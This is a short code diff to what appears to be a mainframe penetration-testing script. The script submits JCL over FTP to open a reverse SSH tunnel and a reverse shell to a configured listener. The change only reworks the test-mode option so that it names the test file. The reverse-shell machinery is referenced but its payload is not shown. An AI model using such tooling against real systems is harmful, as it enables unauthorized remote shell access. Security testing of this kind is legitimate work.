@@ -49,9 +49,9 @@ def parse_configuration():
     parser.add_argument('-s', '--savestate', type=str,
                         help='save the running configuration (including credentials) to a config file',
                         default=None)
-    parser.add_argument('-t', '--test',
-                        help='run in test mode, creates a testing.txt file without running the shell',
-                        default=False, action='store_true')
+    parser.add_argument('-t', '--test', type=str,
+                        help='run in test mode, creates a testing file without running the shell',
+                        default=None)
     parser.add_argument('-v', '--verbose', default=False, action='store_true',
                         help='output verbose progress')
     cli_args = parser.parse_args()
@@ -140,10 +140,13 @@ if __name__ == '__main__':
 
     # Run the JCL to start the SSH tunnel
     logging.info('Running the reverse SSH command')
+    testpath = ''
     if args.test:
         ssh_command = REVERSE_SH_SSH_TO_FILE
+        testpath = '%s/%s' % (config['temporary_path'], args.test)
     else:
         ssh_command = REVERSE_SH_SSH
+        testpath = ''
     ssh_step = Template(ssh_command).substitute(FIFONAME=ftpfifoname,
                                                 KEYNAME=ftpkeyname,
                                                 KNOWNHOSTSFILE=ftpknownhosts,
@@ -153,7 +156,7 @@ if __name__ == '__main__':
                                                 NCIP=config['ebcdiccat_host'],
                                                 NCP=config['ebcdiccat_port'],
                                                 STARTSEND=ReverseShellManager.TERMINATOR_STRING,
-                                                TESTPATH=config['temporary_path']+'/testfile.txt')
+                                                TESTPATH=testpath)
     JCL = Job('FTPJOB')
     JCL.add_inline(mkfifo_step)
     JCL.add_inline(ssh_step)
@@ -170,7 +173,7 @@ if __name__ == '__main__':
 
     # Prepare the reverse shell handling
     if args.test:
-        print('Skipping the shell activation, test mode on')
+        print('Skipping the shell activation, test mode on. Test file in %s', testpath)
     else:
         command = config['shell_command'].split(' ')
         shell = ReverseShellManager(command, config['codepage'],
